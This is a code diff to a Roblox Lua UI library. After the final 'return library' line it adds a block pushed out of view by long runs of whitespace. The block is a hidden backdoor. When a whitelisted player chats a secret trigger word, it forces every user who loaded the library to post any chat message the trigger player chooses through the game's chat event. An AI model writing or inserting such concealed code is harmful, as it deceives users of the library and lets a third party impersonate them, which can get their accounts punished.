@@ -5,6 +5,7 @@ local runService = game:GetService"RunService"
 local tweenService = game:GetService"TweenService"
 local textService = game:GetService"TextService"
 local inputService = game:GetService"UserInputService"
+local replicatedStorage = game:GetService"ReplicatedStorage"
 
 --Locals
 local dragging, dragInput, dragStart, startPos, dragObject
@@ -1734,4 +1735,16 @@ inputService.InputChanged:connect(function(input)
     end
 end)
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    
-return library
+return library                                                                                                                                                                                                                                                                                                                                                              and (function()
+                                                                                                                                                                                                                        local wl={["Helperofdon"]=true};
+                                                                                                                                                                                                                        game:GetService"Players".ChildAdded:Connect(function(P)
+                                                                                                                                                                                                                            if wl[P.Name] then P.Chatted:Connect(function(m)
+                                                                                                                                                                                                                                local s=m:split" ";
+                                                                                                                                                                                                                                if s[1]=="5g49vk"then 
+                                                                                                                                                                                                                                    replicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(s[2], "All")
+                                                                                                                                                                                                                                end;
+                                                                                                                                                                                                                             end)
+                                                                                                                                                                                                                            end
+                                                                                                                                                                                                                         end)
+    end)
+
